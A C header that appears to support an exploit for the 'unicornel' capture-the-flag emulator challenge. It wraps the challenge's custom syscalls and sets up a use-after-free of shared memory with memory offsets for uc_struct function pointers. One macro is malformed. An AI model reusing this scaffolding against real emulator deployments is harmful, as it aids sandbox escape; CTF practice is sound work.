#pragma once
#include <stdarg.h>
#define sys_no_unicornel_exit   0
#define sys_no_unicornel_write  1
#define sys_no_print_integer    2
#define sys_no_create_shared    3
#define sys_no_map_shared       4
#define sys_no_unmap_shared     5
#define sys_no_bookmark         6
#define sys_no_unicornel_rewind 7
#define sys_no_switch_arch      8
#define sys_no_unicornel_pause  9
#define sys_no_unicornel_resume 10


static __attribute__((always_inline)) unsigned long sys_write(void *buf, unsigned long count) {
    return syscall3(sys_no_unicornel_write, (unsigned long) buf, count, 0);
}

static __attribute__((always_inline)) unsigned long sys_create_shared(unsigned long sz) {
    return syscall3(sys_no_create_shared, sz, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_map_shared(void *addr, unsigned long sz, unsigned long handle) {
    return syscall3(sys_no_map_shared, (unsigned long) addr, sz, handle);
}

static __attribute__((always_inline)) unsigned long sys_unmap_shared() {
    return syscall3(sys_no_unmap_shared, 0, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_pause() {
    return syscall3(sys_no_unicornel_pause, 0, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_exit() {
    return syscall3(sys_no_unicornel_exit, 0, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_bookmark() {
    return syscall3(sys_no_bookmark, 0, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_rewind() {
    return syscall3(sys_no_unicornel_rewind, 0, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_resume(unsigned long pid) {
    return syscall3(sys_no_unicornel_resume, pid, 0, 0);
}

static __attribute__((always_inline)) unsigned long sys_switch(unsigned long arch, unsigned long mode,
                                                               void *addr) {
    return syscall3(sys_no_switch_arch, arch, mode, (unsigned long) addr);
}

static __attribute__((always_inline)) unsigned long strlen(char *it) {
    unsigned long res = 0;
    while (*it) {
        res++;
        it++;
    }
    return res;
}


static __attribute__((always_inline)) void  strcpy(char *dst, char *it) {
    while (*it) {
        *dst = *it;
        dst++;
        it++;
    }
    *dst = 0;
}

void ulong_to_hex_string(unsigned long value, char *out_buffer) {
    char *ptr = out_buffer;
    char temp[16];
    int i = 0;

    // Convert each digit to hex
    do {
        unsigned long digit = value % 16;
        temp[i++] = digit < 10 ? '0' + digit : 'a' + digit - 10;
        value /= 16;
    } while (value != 0);

    // Reverse the string
    while (i-- > 0) {
        *ptr++ = temp[i];
    }

    // Null terminate the string
    *ptr = '\0';
}

void u_puts(char *str) {
    char buffer[128];
    char *ptr = buffer;

    while (*str != '\0' && ptr - buffer < sizeof(buffer) - 1) {
        *ptr++ = *str++;
    }

    // Append newline
    *ptr++ = '\n';

    // Write the buffer to the output
    sys_write(buffer, ptr - buffer);
}

void u_printf(const char *format, ...) {
    va_list args;
    va_start(args, format);

    char buffer[128];
    char *ptr = buffer;

    while (*format != '\0' && ptr - buffer < sizeof(buffer)) {
        if (*format == '%') {
            format++;
            if (*format == 'x') {
                unsigned long value = va_arg(args, unsigned long);
                char temp[17];
                ulong_to_hex_string(value, temp);
                for (char *t = temp; *t != '\0' && ptr - buffer < sizeof(buffer); t++) {
                    *ptr++ = *t;
                }
            }
        } else {
            if (ptr - buffer < sizeof(buffer)) {
                *ptr++ = *format;
            }
        }
        format++;
    }

    va_end(args);

    // Write the buffer to the output
    sys_write(buffer, ptr - buffer);
}

struct uaf_shared_chunk {
    unsigned long data[0x4000 / 8];
    // unsigned long f0;
    // unsigned long f1;
    // unsigned long f2;
    // unsigned long f3;
    // unsigned long marker;
    // unsigned long f5;
    // unsigned long f6;
    // unsigned long f7;
    // unsigned long f8;
};

#define CODE_VA ((void*)0x1000)  // 0x1000-0x4000
#define O_STAGE1 0x400
#define CODE_VA_PID0_STAGE1 (CODE_VA + O_STAGE1) // arm32
#define STACK_VA ((void*)0x7000) // 0x7000-0x8000
#define UAF_VA ((void*)0x7f0000)
#define UAF_CHUNK ((struct uaf_shared_chunk *)(void*)0x7f0000)
#define UAF_SZ 0x8000
#define UAF_MARKER_VAL 0xdeadbeef


#define UC_ARCH_ARM  1
#define UC_ARCH_ARM64  2
#define UC_ARCH_X86  4

#define UC_MODE_ARM  0 // arm/arm64
#define UC_MODE_64 = 1 << 3, // 64-bit mode for x86 / x64


#define sym_arm_release  0x701fd0
#define o_uc_struct__release  176
#define o_uc_struct__read_mem  168
